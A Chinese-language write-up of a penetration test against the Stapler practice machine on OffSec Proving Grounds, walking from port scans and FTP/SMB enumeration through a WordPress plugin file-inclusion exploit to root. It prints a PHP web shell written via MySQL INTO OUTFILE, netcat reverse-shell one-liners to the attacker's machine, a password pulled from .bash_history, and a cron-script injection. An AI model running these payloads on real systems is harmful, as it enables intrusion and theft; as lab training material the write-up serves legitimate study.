# Stapler 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：linux
> - **難易度**：easy
> - **開始時間**：2026-06-27

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (RustScan)
使用 RustScan 快速定位開放的連接埠：
```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ rustscan -a 192.168.133.148 -- -sV

PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 61 vsftpd 2.0.8 or later
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open  tcpwrapped  syn-ack ttl 61
80/tcp    open  http        syn-ack ttl 61 PHP cli server 5.5 or later
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open  pkzip-file  syn-ack ttl 61 .ZIP file
3306/tcp  open  mysql       syn-ack ttl 61 MySQL 5.7.12-0ubuntu1
12380/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 21/tcp     | FTP          | vsftpd 2.0.8 or later | 允許匿名登入。 |
| 22/tcp     | SSH          | OpenSSH 7.2p2 Ubuntu 4 | 遠端連線服務。 |
| 53/tcp     | DNS          | tcpwrapped   | - |
| 80/tcp     | HTTP         | PHP cli server 5.5 or later | HTTP 服務，發現 400 Bad Request。 |
| 139/tcp    | SMB          | Samba smbd 3.X - 4.X | 網路共享服務，可列舉共享目錄。 |
| 666/tcp    | ZIP          | pkzip-file   | ZIP 壓縮檔。 |
| 3306/tcp   | MySQL        | MySQL 5.7.12-0ubuntu1 | MySQL 資料庫服務。 |
| 12380/tcp  | HTTP/HTTPS   | Apache httpd 2.4.18 | 強制使用 HTTPS 的 Web 服務。 |

---

### 📂 其他服務列舉 (FTP / SMB)

#### 1. FTP 匿名登入
使用 `anonymous` 成功匿名登入 FTP，發現使用者帳號 `harry`：
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ ftp 192.168.133.148                            
Connected to 192.168.133.148.
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
Name (192.168.133.148:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
```
在目錄中發現 `note` 檔案，下載回 Kali 查看，發現另外兩個帳號 `elly` 與 `john`：
```bash
ftp> ls
-rw-r--r--    1 0        0             107 Jun 03  2016 note
ftp> get note
```
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ cat note                                    
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

#### 2. SMB 訪客登入
使用 `enum4linux` 發現目標允許 `guest` 登入並列舉了共享資料夾：
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ enum4linux 192.168.133.148
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
```
使用 `impacket-smbclient` 登入目標 SMB (139 Port)，並在 `kathy` 資料夾裡下載並發現以下檔案：
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ impacket-smbclient guest@192.168.133.148 -p 139
# use kathy
# cd kathy_stuff
# ls
-rw-rw-rw-         64  Sun Jun  5 11:02:27 2016 todo-list.txt
# cd ../backup
# ls
-rw-rw-rw-       5961  Sun Jun  5 11:03:45 2016 vsftpd.conf
-rw-rw-rw-    6321767  Mon Apr 27 13:14:45 2015 wordpress-4.tar.gz
```
查看 `todo-list.txt`，發現關鍵字 `Initech` 與使用者名稱 `Kathy`：
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ cat todo-list.txt 
I'm making sure to backup anything important for Initech, Kathy
```

---

### 🌐 網頁服務列舉 (Web Enumeration)
*對 HTTPS (12380埠) 等網頁服務進行深度探測。*

#### 📁 目錄爆破 (Dirsearch)
使用 `whatweb` 列舉網頁服務：
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ whatweb http://192.168.133.148:12380/
http://192.168.133.148:12380/ [400 Bad Request] Apache[2.4.18], Title[Tim, we need to-do better next year for Initech], UncommonHeaders[dave]

┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ whatweb https://192.168.133.148:12380/
https://192.168.133.148:12380/ [200 OK] Apache[2.4.18], Title[Tim, we need to-do better next year for Initech]
```
使用 `dirsearch` 掃描目錄，發現 `robots.txt`：
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ dirsearch -u https://192.168.133.148:12380/ -i 200
[09:41:36] 200 -   59B  - /robots.txt
```
查看 `robots.txt`，發現 `/blogblog/` 目錄：

![](image/Pasted%20image%2020260620215543.png)

存取 `/blogblog/`，確認目標使用 WordPress 系統：

![](image/Pasted%20image%2020260620215956.png)

使用 `wpscan` 掃描，發現 WordPress 中啟用了 `advanced-video-embed-embed-videos-or-playlists` 外掛：
```bash
┌──(kali㉿kali)-[~/Desktop/stepler]
└─$ wpscan --url https://192.168.133.148:12380/blogblog/ -e ap --plugins-detection aggressive --disable-tls-checks -o wpscan
```
在輸出的 `wpscan` 日誌中：
```
[+] advanced-video-embed-embed-videos-or-playlists
 | Location: https://192.168.133.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/
 | Version: 1.0 (80% confidence)
```

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
- **發現點 A**：WordPress 外掛 `Advanced Video 1.0` 存在本地檔案包含漏洞 (LFI)。
- **分析思路**：使用 LFI 漏洞讀取 WordPress 的關鍵設定檔 `wp-config.php`，以取得資料庫連線密碼，隨後利用資料庫的 `INTO OUTFILE` 將 Web Shell 寫入伺服器。

---

### 🔑 初始存取突破 (Exploitation)

1. **利用 LFI 獲取資料庫密碼**：
   使用 `searchsploit` 搜尋相關漏洞，並於 GitHub 尋找可用的 [POC (39646.py)](https://github.com/gtech/39646)：
   
   ![](image/Pasted%20image%2020260621020414.png)
   
   修改網址參數並執行，成功讀取到 `wp-config.php`：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/stepler]
   └─$ python3 39646.py
   ```
   
   > [!key] **Database Credentials**
   > *   **DB_NAME**: `wordpress`
   > *   **DB_USER**: `root`
   > *   **DB_PASSWORD**: `plbkac`
   > *   **DB_HOST**: `localhost`

2. **登入 MySQL 資料庫**：
   使用取得的憑證登入 MySQL 並列出資料庫與表結構：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/stepler]
   └─$ mysql -u root -p'plbkac' -h 192.168.133.148 --skip-ssl
   
   MySQL [(none)]> show databases;
   +--------------------+
   | Database           |
   +--------------------+
   | wordpress          |
   ...
   ```
   查詢 `wp_users` 表，發現所有 WordPress 使用者與對應的 Hash：
   ```sql
   MySQL [wordpress]> select * from wp_users;
   ```
   | ID | user_login | Display Name |
   | --- | --- | --- |
   | 1 | John | John Smith |
   | 2 | Elly | Elly Jones |
   | 3 | Peter | Peter Parker |
   ...

3. **尋找 WordPress 根目錄**：
   使用 `curl` 存取不存在的檔案，觸發外掛報錯，藉此洩漏了 Web 根目錄路徑：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/stepler]
   └─$ curl -k 'https://192.168.133.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=test.txt' 
   <b>Warning</b>:  file_get_contents(test.txt)... in <b>/var/www/https/blogblog/...
   ```
   確認網站根目錄為 `/var/www/https/blogblog/`。

4. **寫入 Web Shell 檔案**：
   在 MySQL 終端中執行 `INTO OUTFILE` 將 Web Shell 寫入上傳目錄下：
   ```sql
   MySQL [wordpress]> select '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/https/blogblog/wp-content/uploads/shell.php';
   ```
   驗證 Web Shell 運作正常：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/stepler]
   └─$ curl -k 'https://192.168.133.148:12380/blogblog/wp-content/uploads/shell.php?cmd=whoami'
   www-data
   ```

5. **獲取 Reverse Shell**：
   *   在 Kali 端開啟監聽（`rlwrap nc -lvnp 4444`）。
   *   透過 Web Shell 觸發逆向連線：
       ```bash
       ┌──(kali㉿kali)-[~/Desktop/stepler]
       └─$ curl -k 'https://192.168.133.148:12380/blogblog/wp-content/uploads/shell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.45.159%204444%20%3E%2Ftmp%2Ff'
       ```
   *   成功獲得 `www-data` 的 Shell，並在 `/home` 目錄下取得 `local.txt`。

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
- 發現靶機上所有使用者的家目錄權限皆為 `755` (`drwxr-xr-x`)，這意味著 `www-data` 有權限讀取他們家目錄底下的所有檔案。
- 搜尋所有使用者的命令歷史紀錄 `.bash_history`：
  ```bash
  www-data@red:/home$ find /home -type f -name .bash_history -exec cat {} \; 2>/dev/null
  ```
  在輸出日誌中，發現了使用者 `peter` 的 SSH 登入密碼：
  ```bash
  sshpass -p JZQuyIN5 ssh peter@localhost
  ```

  > [!key] **Peter SSH 系統憑證**
  > *   **Username**: `peter`
  > *   **Password**: `JZQuyIN5`
  > *   **來源**：`.bash_history` 敏感資訊洩漏

---

### 👑 提權利用 (Exploitation to Root)

1. **SSH 登入**：
   使用獲取的密碼登入使用者 `peter` 的 SSH：
   ```bash
   ┌──(kali㉿kali)-[~/Desktop/stepler]
   └─$ ssh peter@192.168.133.148
   peter@192.168.133.148's password: JZQuyIN5
   ```
2. **Sudo 權限提權**：
   執行 `sudo -l` 檢查 Sudo 權限：
   ```bash
   red% sudo -l
   User peter may run the following commands on red:
       (ALL : ALL) ALL
   ```
   可以直接切換為 `root` 帳號：
   ```bash
   red% sudo su
   ➜  peter whoami
   root
   ```
   成功取得 root 權限，並在 `/root` 目錄下尋獲 `proof.txt`。

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **為什麼這個漏洞會存在？**
   - **不安全的外掛**：使用了存在 LFI 漏洞的舊版 WordPress 外掛。
   - **資料庫權限配置不當**：資料庫 `root` 使用者可以直接寫入 Web 目錄。
   - **家目錄權限過大與命令紀錄殘留**：使用者家目錄（如 `.bash_history`）設定過於寬鬆（755），且明文密碼殘留在命令歷史中。
2. **安全防禦建議：**
   - 應定期更新 WordPress 的外掛。
   - 限制資料庫使用者的權限，禁止其讀寫本機檔案的特權。
   - 將使用者的家目錄權限限縮至 `700`，並避免在命令列中明文輸入密碼。

---

## 📝 5. 補充與替代路徑

### 1. 替代初始存取路徑：WordPress 帳密爆破與外掛上傳
除了 LFI 漏洞外，也可以透過帳密暴力破解獲取權限：
1. **使用者列舉與密碼爆破**：
   使用 `wpscan` 列舉系統中的使用者，並搭配 `rockyou.txt` 進行密碼爆破，可成功取得管理員 `john` 的密碼：
   ```bash
   wpscan --url https://192.168.133.148:12380/blogblog/ --disable-tls-checks --usernames john,peter,barry... --passwords /usr/share/wordlists/rockyou.txt
   ```
2. **上傳惡意外掛**：
   登入 `/wp-login.php` 後台，透過 `Plugins > Add New > Upload Plugin` 功能上傳包含 PHP Shell 的 ZIP 檔案（FTP 提示直接留空）。
3. **觸發連線**：
   存取上傳的外掛路徑即可觸發 Reverse Shell，取得 `www-data` Shell。

### 2. 替代提權路徑：可寫定時任務提權 (Cron Job)
1. **發現定時任務**：
   檢查發現 root 每 5 分鐘會自動執行清理指令碼 `/usr/local/sbin/cron-logrotate.sh`。
2. **檢查檔案權限**：
   該指令碼對 `other` 具有寫入權限。
3. **注入惡意指令**：
   ```bash
   echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI_IP> 4444 >/tmp/f" > /usr/local/sbin/cron-logrotate.sh
   ```
4. **取得 Root**：
   本機開啟 `nc -lvnp 4444` 監聽，等待定時任務執行即可獲取 root 權限。
